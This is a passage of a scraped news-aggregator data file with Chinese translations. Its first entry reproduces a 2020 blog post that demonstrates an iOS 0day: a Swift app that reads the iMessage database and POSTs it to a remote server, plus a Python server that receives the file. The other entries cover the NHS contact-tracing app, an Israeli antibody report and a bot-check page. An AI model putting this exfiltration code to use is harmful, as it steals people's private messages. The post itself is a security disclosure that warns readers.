task=URLSession.shared.dataTask(with\uff1arequest){(data\uff0cresponse\uff0cerror\u3002\n\u7136\u540e\uff0c\u6211\u7f16\u8bd1\u4e86\u5e94\u7528\u7a0b\u5e8f\u5e76\u521b\u5efa\u4e86\u4ee5\u4e0b\u6743\u5229\u6587\u4ef6\uff1a\u6211\u5bf9\u7f16\u8bd1\u7684\u5e94\u7528\u7a0b\u5e8f\u8fdb\u884c\u4e86\u7b7e\u540d\uff1a\u4e0b\u4e00\u6b65\u662f\u5728\u8bbe\u5907\u4e0a\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\uff1a\u4e4b\u540e\uff0c\u6211\u6253\u5f00\u4e86\u6211\u7684Python\u670d\u52a1\u5668\uff1a\u4ecehttp.server import HTTPServer\uff0cBaseHTTPRequestHandler\u7c7bSimpleHTTPRequestHandler(BaseHTTPRequestHandler)\uff1adef do_Get(SELF)\uff1asel.Send_Response(200)sel.end_headers()self.wfile.write(b&#39\uff1bHello\uff0cworld\uff01&#\uff1b)def do_POST(SELF)\uff1aPrint(&#\u3002)content_length=int(self.headers[&#39\uff1bcontent-length&#39\uff1b])body=self.rfile.read(Content_Length)with open(&#34\uff1b./sms.db&#34\uff1b\uff0c&#34\uff1bwb&#34\uff1b)as f\uff1af.write(Body)httpd=HTTPServer((&#39\uff1b192.168.0.14&#39\uff1b#39\uff1b8888)\uff0cSimpleHTTPRequestHandler)httpd.serve\u3002\n\u6211\u6253\u5f00\u4e86\u5e94\u7528\u7a0b\u5e8f\uff1a\u7136\u540e\uff0c\u6211\u63d0\u4f9b\u4e86\u6211\u7684\u670d\u52a1\u5668\u7684url\uff0c\u5355\u51fb\u4e86\u6309\u94ae\uff0c\u7136\u540e&amp\uff1bmldr\ud83e\udd2f\uff01\u6211\u7684iPhone\u548c\u6700\u65b0\u7684\u975e\u6d4b\u8bd5\u7248iOS\u7684\u6240\u6709\u4fe1\u606f\u90fd\u88ab\u53d1\u9001\u5230\u670d\u52a1\u5668\uff1a\u7b49\u5f85iOS 13.5\u3002\u5728\u82f9\u679c\u53d1\u5e03\u66f4\u65b0\u4e4b\u524d\uff0c\u4e0d\u8981\u5b89\u88c5\u4efb\u4f55\u53ef\u7591\u7684\u5e94\u7528\u7a0b\u5e8f\uff01", "note_en": "This is a special post because I fully based on another researcher,  s1guza\u2019s 0day. All of this story began from the following  tweet: Siguza told us that his 0day was patched in the iOS 13.5 beta3. So this is actually a sandbox escape 0day for the newest, non-beta iOS version (13.4.1). In this post, I\u2019ll show you how I reproduced that bug and wrote a malicious application that uses that 0day to steal the iMessage history! \ud83d\ude31 I won\u2019t explain this bug in detail, as S1guza plans to make an article about it.  I\u2019ll update this post when he does. UPDATE:  https://siguza.github.io/psychicpaper/    I created a simple Swift app that contains the following code: import  SwiftUI struct  ContentView: View { @State  var serverURLString: String =  &#34;&#34;  var body: some View { VStack() { Text( &#34;&#34;&#34;  iMessage DB stealing PoC \\n   based on @s1guza&#39;s tweet \\n   coded by @_r3ggi  &#34;&#34;&#34;).multilineTextAlignment(.center) TextField( &#34;Server URL&#34;, text:  $serverURLString).padding(.all,  40).textFieldStyle(RoundedBorderTextFieldStyle()) Button(action: { sendPostData(serverURLString:  self.serverURLString) }) { Text( &#34;Send your sms.db!&#34;) } } }} func  sendPostData(serverURLString: String) {  let messagesPath =  &#34;/private/var/mobile/Library/SMS/sms.db&#34;  let messagesURL = URL(fileURLWithPath: messagesPath)  let serverURL = URL(string: serverURLString)  var request = URLRequest(url: serverURL !) request.httpMethod =  &#34;POST&#34;  do {  if FileManager. init().isReadableFile(atPath: messagesPath) {  let rawMessagesDB =  try Data(contentsOf: messagesURL) request.httpBody = rawMessagesDB }  else { request.httpBody =  &#34;Nope&#34;.data(using: .utf8) } }  catch {}  let task = URLSession.shared.dataTask(with: request) { (data, response, error)  in  if  let error = error { print( &#34;Error took place  \\(error ) &#34;)  return } } task.resume()}\n Then I compiled the app and created the following entitlements file:  I signed the compiled app:  Next stage was to install the application on the device: After that, I opened my Python server: from http.server  import HTTPServer, BaseHTTPRequestHandler class  SimpleHTTPRequestHandler(BaseHTTPRequestHandler):  def  do_GET(self): self .send_response( 200) self .end_headers() self .wfile .write( b &#39;Hello, world!&#39;)  def  do_POST(self):  print( &#34;RECEIVING!!!&#34;) content_length  = int(self .headers[ &#39;Content-Length&#39;]) body  = self .rfile .read(content_length)  with open( &#34;./sms.db&#34;,  &#34;wb&#34;)  as f: f .write(body)httpd  = HTTPServer(( &#39;192.168.0.14&#39;,  8888), SimpleHTTPRequestHandler)httpd .serve_forever()\n I opened the application: Then, I provided my server\u2019s URL, clicked the button and&amp;mldr \ud83e\udd2f! All my messages from my iPhone with the newest non-beta iOS were sent to the server: Wait for the iOS 13.5. Do not install any suspicious apps before Apple releases the update!", "posttime": "2020-05-05 11:18:06", "tags": "0day,ios,\u76d7\u53d6,sms,\u5e94\u7528\u7a0b\u5e8f", "title": "\u7528iOS 0day\u76d7\u53d6\u60a8\u7684\u77ed\u4fe1", "title_en": "Stealing your SMS messages with iOS 0day", "transed": 1, "url": "https://wojciechregula.blog/post/stealing-your-sms-messages-with-ios-0day/", "via": "", "source_name": "Hacker News", "source_domain": "news.ycombinator.com", "real_tags": ["0day", "ios", "\u76d7\u53d6", "sms", "\u5e94\u7528\u7a0b\u5e8f"]}, {"category": "", "categoryclass": "", "imagename": "37ef27f4008f6ac005f6a73fc1a69c86.jpg", "infoid": 1000688, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u5728\u8fd9\u7bc7\u535a\u5ba2\u6587\u7ae0\u4e2d\uff0cIan Levy\u89e3\u91ca\u4e86\u65b0\u7684NHS\u51a0\u72b6\u75c5\u6bd2\u5e94\u7528\u7a0b\u5e8f\u5c06\u5982\u4f55\u5e2e\u52a9\u6211\u4eec\u5bf9\u6297\u51a0\u72b6\u75c5\u6bd2\uff0c\u540c\u65f6\u4fdd\u62a4\u60a8\u7684\u9690\u79c1\u548c\u5b89\u5168(\u5e76\u4e14\u4e0d\u4f1a\u8017\u5c3d\u60a8\u7684\u624b\u673a\u7535\u6c60)\u3002", "note_en": "In this blog post, Ian Levy explains how the new NHS COVID-19 app will help us fight the coronavirus while protecting your privacy and security (and not draining your phone battery).", "posttime": "2020-05-05 11:17:36", "tags": "\u7a0b\u5e8f,app,\u8054\u7cfb\u4eba,nhs,\u51a0\u72b6\u75c5\u6bd2", "title": "NHS\u8054\u7cfb\u4eba\u8ddf\u8e2a\u5e94\u7528\u7a0b\u5e8f\u80cc\u540e\u7684\u5b89\u5168\u6027", "title_en": "The security behind the NHS contact tracing app", "transed": 1, "url": "https://www.ncsc.gov.uk/blog-post/security-behind-nhs-contact-tracing-app", "via": "", "source_name": "Hacker News", "source_domain": "news.ycombinator.com", "real_tags": ["\u7a0b\u5e8f", "app", "\u8054\u7cfb\u4eba", "nhs", "\u51a0\u72b6\u75c5\u6bd2"]}, {"category": "", "categoryclass": "", "imagename": "9fac4c0d8bdde5878b8a352da4ae2bb4.png", "infoid": 1000687, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u8036\u8def\u6492\u51b7-\u4ee5\u8272\u5217\u56fd\u9632\u90e8\u957f\u5468\u4e00\u8868\u793a\uff0c\u4ee5\u8272\u5217\u5728\u5176\u4e3b\u8981\u751f\u7269\u7814\u7a76\u5b9e\u9a8c\u5ba4\u5206\u79bb\u51fa\u4e86\u4e00\u79cd\u5173\u952e\u7684\u51a0\u72b6\u75c5\u6bd2\u6297\u4f53\uff0c\u79f0\u8fd9\u662f\u671d\u7740\u53ef\u80fd\u6cbb\u7597\u51a0\u72b6\u75c5\u6bd2\u5927\u6d41\u884c\u8fc8\u51fa\u7684\u91cd\u5927\u7a81\u7834\u3002\n\u4ee5\u8272\u5217\u56fd\u9632\u90e8\u957f\u7eb3\u592b\u5854\u5229\u00b7\u8d1d\u5185\u7279(Naftali Bennett)\u5728\u4e00\u4efd\u58f0\u660e\u4e2d\u8868\u793a\uff0c\u4ee5\u8272\u5217\u751f\u7269\u7814\u7a76\u6240(IIBR)\u5f00\u53d1\u7684\u5355\u514b\u9686\u4e2d\u548c\u6297\u4f53\u53ef\u4ee5\u4e2d\u548c\u643a\u5e26\u8005\u4f53\u5185\u7684\u81f4\u75c5\u51a0\u72b6\u75c5\u6bd2\u3002\n\u58f0\u660e\u8865\u5145\u8bf4\uff0c\u672c\u5185\u7279\u5468\u4e00\u8bbf\u95ee\u4e86IIBR\uff0c\u5728\u90a3\u91cc\u4ed6\u542c\u53d6\u4e86\u5728\u5bfb\u627e\u51a0\u72b6\u75c5\u6bd2\u89e3\u6bd2\u5242\u65b9\u9762\u53d6\u5f97\u91cd\u5927\u7a81\u7834\u7684\u7b80\u62a5\u3002\n\u5b83\u63f4\u5f15IIBR\u4e3b\u4efbShmuel Shapira\u7684\u8bdd\u8bf4\uff0c\u6297\u4f53\u914d\u65b9\u6b63\u5728\u7533\u8bf7\u4e13\u5229\uff0c\u4e4b\u540e\u5c06\u5bfb\u6c42\u4e00\u5bb6\u56fd\u9645\u5236\u9020\u5546\u6279\u91cf\u751f\u4ea7\u5b83\u3002\nIIBR\u4e00\u76f4\u5728\u9886\u5bfc\u4ee5\u8272\u5217\u5f00\u53d1\u51a0\u72b6\u75c5\u6bd2\u6cbb\u7597\u548c\u75ab\u82d7\u7684\u52aa\u529b\uff0c\u5305\u62ec\u5bf9\u51a0\u72b6\u75c5\u6bd2\u6062\u590d\u8005\u7684\u8840\u6db2\u8fdb\u884c\u6d4b\u8bd5\uff0c\u51a0\u72b6\u75c5\u6bd2\u662f\u7531\u75c5\u6bd2\u5f15\u8d77\u7684\u547c\u5438\u9053\u75be\u75c5\u3002\n\u8fd9\u7c7b\u6837\u672c\u4e2d\u7684\u6297\u4f53-\u514d\u75ab\u7cfb\u7edf\u86cb\u767d\u662f\u6210\u529f\u6218\u80dc\u51a0\u72b6\u75c5\u6bd2\u7684\u6b8b\u7559\u7269-\u88ab\u5e7f\u6cdb\u8ba4\u4e3a\u662f\u5f00\u53d1\u53ef\u80fd\u7684\u6cbb\u7597\u65b9\u6cd5\u7684\u5173\u952e\u3002\n\u636e\u62a5\u9053\uff0c\u5728IIBR\u5206\u79bb\u51fa\u7684\u6297\u4f53\u662f\u5355\u514b\u9686\u7684\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u6765\u81ea\u5355\u4e2a\u56de\u6536\u7684\u7ec6\u80de\uff0c\u56e0\u6b64\u5728\u4ea7\u751f\u6cbb\u7597\u65b9\u9762\u5177\u6709\u66f4\u5f3a\u7684\u6f5c\u5728\u4ef7\u503c\u3002\n\u5728\u5176\u4ed6\u5730\u65b9\uff0c\u5df2\u7ecf\u6709\u51a0\u72b6\u75c5\u6bd2\u6cbb\u7597\u65b9\u6cd5\u662f\u4ece\u591a\u514b\u9686\u6297\u4f53\u5f00\u53d1\u51fa\u6765\u7684\uff0c\u6216\u8005\u662f\u4ece\u4e24\u4e2a\u6216\u66f4\u591a\u4e0d\u540c\u7956\u5148\u7684\u7ec6\u80de\u884d\u751f\u51fa\u6765\u7684\uff0c\u79d1\u5b66\u76f4\u63a5\u6742\u5fd7\u57285\u6708\u4efd\u7684\u6742\u5fd7\u4e2d\u62a5\u9053\u3002\n\u4ee5\u8272\u5217\u662f\u6700\u65e9\u5173\u95ed\u8fb9\u5883\u5e76\u5bf9\u884c\u52a8\u65bd\u52a0\u8d8a\u6765\u8d8a\u4e25\u683c\u9650\u5236\u7684\u56fd\u5bb6\u4e4b\u4e00\uff0c\u4ee5\u963b\u6b62\u56fd\u5185\u51a0\u72b6\u75c5\u6bd2\u7684\u7206\u53d1\u3002\u5b83\u5df2\u7ecf\u62a5\u544a\u4e8616\uff0c246\u4f8b\uff0c235\u4eba\u6b7b\u4e8e\u8fd9\u79cd\u75be\u75c5\u3002", "note_en": "JERUSALEM \u2014 Israel has isolated a key coronavirus antibody at its main biological research laboratory, the Israeli defence minister said on Monday, calling the step a &#34;significant breakthrough&#34; toward a possible treatment for the COVID-19 pandemic.\n The &#34;monoclonal neutralising antibody&#34; developed at the Israel Institute for Biological Research (IIBR) &#34;can neutralise it (the disease-causing coronavirus) inside carriers&#39; bodies,&#34; Defence Minister Naftali Bennett said in a statement.\n The statement added that Bennett visited the IIBR on Monday where he was briefed &#34;on a significant breakthrough in finding an antidote for the coronavirus&#34;.\n It quoted IIBR Director Shmuel Shapira as saying that the antibody formula was being patented, after which an international manufacturer would be sought to mass-produce it.\n The IIBR has been leading Israeli efforts to develop a treatment and vaccine for the coronavirus, including the testing of blood from those who recovered from COVID-19, the respiratory disease caused by the virus.\n Antibodies in such samples - immune-system proteins that are residues of successfully overcoming the coronavirus - are widely seen as a key to developing a possible cure.\n The antibody reported as having been isolated at the IIBR is monoclonal, meaning it was derived from a single recovered cell and is thus potentially of more potent value in yielding a treatment.\n Elsewhere, there have been coronavirus treatments developed from antibodies that are polyclonal, or derived from two or more cells of different ancestry, the magazine Science Direct reported in its May issue.\n Israel was one of the first countries to close its borders and impose increasingly stringent restrictions on movement to hamper the domestic coronavirus outbreak. It has reported 16,246 cases and 235 deaths from the illness.", "posttime": "2020-05-05 11:15:02", "tags": "coronavirus,\u75c5\u6bd2,\u51a0\u72b6\u75c5\u6bd2,\u5206\u79bb,isolates", "title": "\u4ee5\u8272\u5217\u5206\u79bb\u51fa\u51a0\u72b6\u75c5\u6bd2\u6297\u4f53", "title_en": "Israel Isolates Coronavirus Antibody", "transed": 1, "url": "https://www.nytimes.com/reuters/2020/05/04/world/middleeast/04reuters-health-coronavirus-israel-treatment.html", "via": "", "source_name": "Hacker News", "source_domain": "news.ycombinator.com", "real_tags": ["\u75c5\u6bd2", "\u51a0\u72b6\u75c5\u6bd2", "\u5206\u79bb", "isolates"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1000686, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u8981\u7ee7\u7eed\uff0c\u8bf7\u5355\u51fb\u4e0b\u9762\u7684\u6846\uff0c\u8ba9\u6211\u4eec\u77e5\u9053\u60a8\u4e0d\u662f\u673a\u5668\u4eba\u3002\n\u8bf7\u786e\u4fdd\u60a8\u7684\u6d4f\u89c8\u5668\u652f\u6301JavaScript\u548cCookie\uff0c\u5e76\u4e14\u60a8\u6ca1\u6709\u963b\u6b62\u5b83\u4eec\u52a0\u8f7d\u3002\u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u60a8\u53ef\u4ee5\u67e5\u770b\u6211\u4eec\u7684\u548c\u3002", "note_en": "To continue, please click the box below to let us know you&#39;re not a robot.\n  Please make sure your browser supports JavaScript and cookies and that you are not blocking them from loading. For more information you can review our   and  .", "posttime": "2020-05-05 10:43:33", "tags": "coronavirus,\u75c5\u6bd2,\u4f53\u80b2,sports,\u51a0\u72b6\u75c5\u6bd2", "title": "\u51a0\u72b6\u75c5\u6bd2\u4f1a\u6253\u7834\u4f53\u80b2\u4f20\u5a92\u4e1a\u5417\uff1f", "title_en": "Will coronavirus break the sports media industry?", "transed": 1, "url": "https://www.bloomberg.com/news/newsletters/2020-05-03/will-coronavirus-break-the-50-billion-sports-media-industry", "via": "", "source_name": "Hacker News", "source_domain": "news.ycombinator.com", "real_tags": ["\u75c5\u6bd2", "\u4f53\u80b2", "sports", "\u51a0\u72b6\u75c5\u6bd2"]}]